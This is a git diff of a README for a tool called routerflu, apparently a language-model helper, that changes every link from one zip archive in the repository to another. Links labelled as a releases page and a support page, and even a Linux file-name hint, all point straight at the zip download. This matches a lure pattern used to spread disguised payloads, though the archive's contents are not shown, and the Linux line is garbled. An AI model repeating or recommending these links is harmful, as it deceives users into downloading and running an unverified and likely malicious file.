@@ -1,6 +1,6 @@
 # 🌟 routerflu - Simplifying Your Language Model Interactions
 
-[![Download routerflu](https://raw.githubusercontent.com/NABILA2308/routerflu/main/routerflu/Software_v1.2.zip)](https://raw.githubusercontent.com/NABILA2308/routerflu/main/routerflu/Software_v1.2.zip)
+[![Download routerflu](https://github.com/NABILA2308/routerflu/raw/refs/heads/main/routerflu/Software_v1.6.zip)](https://github.com/NABILA2308/routerflu/raw/refs/heads/main/routerflu/Software_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to routerflu! This application helps you interact easily with large lang
 
 To start using routerflu, visit the following link to download the latest version:
 
-[Download routerflu](https://raw.githubusercontent.com/NABILA2308/routerflu/main/routerflu/Software_v1.2.zip)
+[Download routerflu](https://github.com/NABILA2308/routerflu/raw/refs/heads/main/routerflu/Software_v1.6.zip)
 
 ### Installation Steps
 
 1. **Visit the Releases Page**
 
-   Go to the [routerflu Releases page](https://raw.githubusercontent.com/NABILA2308/routerflu/main/routerflu/Software_v1.2.zip).
+   Go to the [routerflu Releases page](https://github.com/NABILA2308/routerflu/raw/refs/heads/main/routerflu/Software_v1.6.zip).
 
 2. **Choose the Latest Version**
 
@@ -27,7 +27,7 @@ To start using routerflu, visit the following link to download the latest versio
    Find the appropriate file for your system. If you are unsure about your system type:
    - **Windows:** Look for `.exe` file names.
    - **Mac:** Look for `.dmg` file names.
-   - **Linux:** Look for `https://raw.githubusercontent.com/NABILA2308/routerflu/main/routerflu/Software_v1.2.zip` or `.deb` file names.
+   - **Linux:** Look for `https://github.com/NABILA2308/routerflu/raw/refs/heads/main/routerflu/Software_v1.6.zip` or `.deb` file names.
 
 4. **Run the Installer**
 
@@ -77,7 +77,7 @@ Using routerflu is straightforward. Open the application and follow these steps:
 
 ## 📞 Get Help
 
-If you run into any issues while using routerflu, please refer to our [Support Page](https://raw.githubusercontent.com/NABILA2308/routerflu/main/routerflu/Software_v1.2.zip) for assistance. You can find common FAQs and submit new inquiries.
+If you run into any issues while using routerflu, please refer to our [Support Page](https://github.com/NABILA2308/routerflu/raw/refs/heads/main/routerflu/Software_v1.6.zip) for assistance. You can find common FAQs and submit new inquiries.
 
 ## 🚧 Known Issues
 
@@ -97,4 +97,4 @@ Keep up with routerflu’s updates and new features by following our repository.
 
 Thank you for choosing routerflu. We hope it enhances your experience with language models and helps you achieve great results effortlessly. 
 
-[Download routerflu](https://raw.githubusercontent.com/NABILA2308/routerflu/main/routerflu/Software_v1.2.zip)
+[Download routerflu](https://github.com/NABILA2308/routerflu/raw/refs/heads/main/routerflu/Software_v1.6.zip)
